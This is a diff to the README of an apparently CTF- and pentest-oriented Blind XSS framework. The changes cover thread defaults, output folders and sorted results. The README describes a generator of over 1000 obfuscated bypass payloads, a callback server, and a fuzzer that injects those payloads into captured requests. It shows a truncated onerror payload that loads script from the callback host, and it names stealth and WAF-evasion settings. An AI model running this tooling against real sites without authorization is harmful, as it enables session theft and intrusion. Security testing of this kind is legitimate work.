@@ -30,8 +30,11 @@ This framework provides an end-to-end solution for testing **Blind XSS** vulnera
 
 **Key Features:**
 - ✅ **1000+** bypass payloads (base64, obfuscation, polyglots, event handlers)
-- ✅ **Automatic tracking** - Know exactly which payload worked
-- ✅ **Multi-threaded fuzzing** - Test faster with parallel browsers
+- ✅ **Automatic tracking** - Know exactly which payload worked via unique IDs
+- ✅ **Multi-threaded fuzzing** - 1-10 threads (default: 1 for stealth, max: 10 for safety)
+- ✅ **Auto-sorted results** - All output files organized by payload ID
+- ✅ **Smart folder management** - Auto-creates folders, organizes logs
+- ✅ **Runtime ID tags** - Clear `[ID N]` markers in multi-threading output
 - ✅ **First-order & Second-order XSS** detection
 - ✅ **CTF mode** - Prevent spam from repeated hits
 - ✅ **3 encoding formats** - URL, Form, JSON
@@ -153,12 +156,17 @@ sudo python3 callback_server.py --http-only --http-port 8080
 **Arguments:**
 - `--domain` - Your domain name (e.g., `your-server.com`)
 - `--cert-dir` - SSL certificate directory (default: `./ssl-certs`)
-- `--result` - Save working payloads to file (optional)
+- `--result` - Save working payloads to file (e.g., `result/working.txt`, auto-creates folder)
 - `--wordlist` - Wordlist path (default: `wordlists/www_input_payloads.txt`)
 - `--ctf-mode` - Enable CTF mode (limit hits per payload)
 - `--max-hits` - Max hits per payload in CTF mode (default: 3)
 - `--http-only` / `--https-only` - Run only HTTP or HTTPS
 - `--http-port` / `--https-port` - Custom ports
+
+**Output Files:**
+- Result file: `--result` path (e.g., `result/working.txt`)
+- Log file: Same folder as result file (e.g., `result/xss_hits.log`)
+- Both files **auto-sorted by ID** on server shutdown (Ctrl+C)
 
 **SSL Certificate Setup:**
 ```bash
@@ -184,6 +192,12 @@ Payload:    <img src=x onerror="var s=document.createElement('scri...
 ======================================================================
 💡 Find payload: sed -n '123p' wordlists/www_input_payloads.txt
 ======================================================================
+
+On shutdown (Ctrl+C):
+Sorting files by ID...
+✓ Sorted result file by ID: result/working.txt
+✓ Sorted log file by ID: result/xss_hits.log
+✓ Done
 ```
 
 ---
@@ -246,9 +260,9 @@ python3 auto_xss_test.py \
 - `--request` - HTTP request file (Burp Suite format) with `FUZZ` marker
 - `--target` - Alternative: Direct URL with `FUZZ` (e.g., `https://target.com/search?q=FUZZ`)
 - `--wordlist` - Payload wordlist (default: `wordlists/www_input_payloads.txt`)
-- `--threads` - Number of concurrent threads (default: 5, use 1 for single-threaded)
+- `--threads` - Number of concurrent threads (default: 1, max: 10)
 - `--delay` - Delay in seconds after loading each page (default: 3)
-- `--output` - Output file for findings (default: `potential_xss.txt`)
+- `--output` - Output file for findings (default: `result/findings.txt`, auto-creates folder)
 - `--second-order` - Second-order request file for stored XSS detection
 - `--server` - Callback server URL (auto-detected from wordlist if not specified)
 - `--no-headless` - Show browser window (debugging, single-threaded only)
@@ -273,8 +287,35 @@ Cookie: session=abc123
 ```
 
 **Output:**
-- `potential_xss.txt` - Detected XSS (via source analysis)
+- `result/findings.txt` - Detected XSS (via source analysis, auto-sorted by ID)
 - Check `callback_server.py` for confirmed callbacks
+
+**Features:**
+- ✅ **Auto-sort by ID** - Results sorted by payload ID for easy review
+- ✅ **Runtime ID tags** - All detections show `[ID N]` for multi-threading clarity
+- ✅ **Auto-folder creation** - Output folder automatically created
+- ✅ **Max 10 threads** - System resource protection
+
+**Runtime Output Example (Multi-threading):**
+```
+[5] Testing payload ID 5...
+    Payload: <svg onload=...
+    ℹ [ID 5] Payload NOT detected in any form
+    Waiting 3s for callback...
+    ✓ Done
+
+[6] Testing payload ID 6...
+    Payload: <iframe src=...
+    🎯 [ID 6] DOM-BASED XSS [CONFIRMED]    # ← Clear ID tag!
+    ✓ Execution DETECTED via browser
+    ✓ Resource load to callback server detected
+    Triggering events...
+    Waiting 3s for callback...
+    ✓ Done
+
+Sorting results by ID...
+✓ Sorted findings by ID: result/findings.txt
+```
 
 ---
 
@@ -336,7 +377,7 @@ python3 blind_xss_generate.py \
 sudo python3 callback_server.py \
   --domain your-server.com \
   --cert-dir ./ssl-certs \
-  --result working.txt \
+  --result result/working.txt \
   --ctf-mode
 
 # 3. Create Burp request file (burp.txt)
@@ -349,13 +390,18 @@ Content-Type: application/json
 {"comment":"FUZZ","author":"test"}
 EOF
 
-# 4. Run automated testing
+# 4. Run automated testing (default 1 thread, use --threads 5 for speed)
 python3 auto_xss_test.py \
   --request burp.txt \
   --wordlist wordlists/json_input_payloads.txt \
   --threads 5
 
 # 5. Watch callback server for hits!
+# Results will be in:
+# - result/working.txt (confirmed payloads)
+# - result/findings.txt (browser-detected XSS)
+# - result/xss_hits.log (all callback hits)
+# All files auto-sorted by ID!
 ```
 
 ### Using ngrok (No Server Needed)
@@ -430,20 +476,22 @@ python3 auto_xss_test.py \
 ### Multi-Threading Performance
 
 ```bash
-# Conservative (5 threads) - recommended
+# Default (1 thread) - stealthy, careful
+python3 auto_xss_test.py --request burp.txt
+
+# Balanced (5 threads) - recommended for speed
 python3 auto_xss_test.py --request burp.txt --threads 5
 
-# Fast (10 threads) - may trigger WAF/rate limiting
+# Fast (10 threads - MAXIMUM) - may trigger WAF/rate limiting
 python3 auto_xss_test.py --request burp.txt --threads 10 --delay 1
-
-# Careful (1 thread) - stealthy, slow
-python3 auto_xss_test.py --request burp.txt --threads 1 --delay 5
 ```
 
 **Performance:**
-- 1 thread: ~20 payloads/min (careful, stealthy)
-- 5 threads: ~100 payloads/min (balanced)
-- 10 threads: ~200 payloads/min (fast, aggressive)
+- 1 thread (default): ~20 payloads/min (stealthy, safe)
+- 5 threads: ~100 payloads/min (balanced, recommended)
+- 10 threads (max): ~200 payloads/min (fast, aggressive)
+
+**Note:** Maximum 10 threads enforced to prevent system resource exhaustion. Attempting more will auto-cap at 10 with a warning.
 
 ### Choosing the Right Wordlist
 
@@ -624,7 +672,38 @@ python3 auto_xss_test.py \
   --threads 1 --no-headless --delay 10
 
 # Monitor callback server logs in real-time
+tail -f result/xss_hits.log
+
+# Or if using default location
 tail -f xss_hits.log
+```
+
+### Issue: "Where are my output files?"
+
+**Answer:** All output files are organized in folders:
+
+```bash
+# Default structure (with --result result/working.txt):
+result/
+├── working.txt      # Confirmed working payloads (from callback_server.py)
+├── findings.txt     # Browser-detected XSS (from auto_xss_test.py)
+└── xss_hits.log     # All callback hits log
+
+# All files automatically sorted by payload ID!
+```
+
+**Custom folder:**
+```bash
+# Using custom path
+python3 callback_server.py --result ctf/challenge1/working.txt
+
+# Output structure:
+ctf/challenge1/
+├── working.txt
+└── xss_hits.log
+
+# auto_xss_test.py can use different folder
+python3 auto_xss_test.py --output ctf/challenge1/findings.txt
 ```
 
 ---
@@ -647,9 +726,12 @@ Each wordlist contains 4 sections:
 1. **Always start callback server first** before running tests
 2. **Use CTF mode** when testing CTF challenges to prevent spam
 3. **Choose correct wordlist** based on request type (GET/POST form/POST JSON)
-4. **Start with 5 threads** and adjust based on target behavior
-5. **Check both `auto_xss_test.py` output AND `callback_server.py` logs** for complete results
-6. **Use second-order testing** when testing stored XSS scenarios
+4. **Start with 1 thread** (default, stealthy), use 5+ threads for speed
+5. **Max 10 threads** enforced - don't exceed system limits
+6. **Check sorted output files** - Results organized by ID for easy review
+7. **Check both `auto_xss_test.py` output AND `callback_server.py` logs** for complete results
+8. **Use second-order testing** when testing stored XSS scenarios
+9. **Review sorted logs** - `result/findings.txt` and `result/xss_hits.log` sorted by ID on completion
 
 ### Security Considerations
 
@@ -665,14 +747,21 @@ Each wordlist contains 4 sections:
 | Script | Purpose | Input | Output |
 |--------|---------|-------|--------|
 | `blind_xss_generate.py` | Generate payloads | Server URL | Wordlists (3 files) |
-| `callback_server.py` | Receive callbacks | Wordlist + SSL cert | Console logs + result file |
-| `auto_xss_test.py` | Automated testing | Request file + Wordlist | `potential_xss.txt` |
+| `callback_server.py` | Receive callbacks | Wordlist + SSL cert | `result/working.txt` + `result/xss_hits.log` (sorted) |
+| `auto_xss_test.py` | Automated testing | Request file + Wordlist | `result/findings.txt` (sorted) |
 
 **Workflow:** Generate → Listen → Test → Analyze
 
 **Detection:** Browser-based (HTML + DOM) + Callback server confirmation
 
 **Result:** Know exactly which payload worked via tracking ID
+
+**New Features:**
+- ✅ Default 1 thread (stealthy), max 10 threads (safe)
+- ✅ Auto-folder creation (`result/` by default)
+- ✅ Auto-sorted output files by payload ID
+- ✅ Runtime `[ID]` tags for clarity in multi-threading
+- ✅ Log files organized in same folder as results
 
 ---
 
@@ -685,13 +774,18 @@ Each wordlist contains 4 sections:
 python3 blind_xss_generate.py --server https://your-server.com
 
 # 2. Listen
-sudo python3 callback_server.py --domain your-server.com --cert-dir ./ssl-certs --result working.txt
+sudo python3 callback_server.py \
+  --domain your-server.com \
+  --cert-dir ./ssl-certs \
+  --result result/working.txt
 
-# 3. Test
+# 3. Test (default: 1 thread, output to result/findings.txt)
 python3 auto_xss_test.py --request burp.txt --wordlist wordlists/www_input_payloads.txt
 
-# 4. Check results
-cat working.txt
+# 4. Check results (all sorted by ID)
+cat result/working.txt    # Confirmed working payloads
+cat result/xss_hits.log   # All hits log
+cat result/findings.txt   # Browser-detected XSS
 ```
 
 ### Example 2: CTF Challenge (Fast Mode)
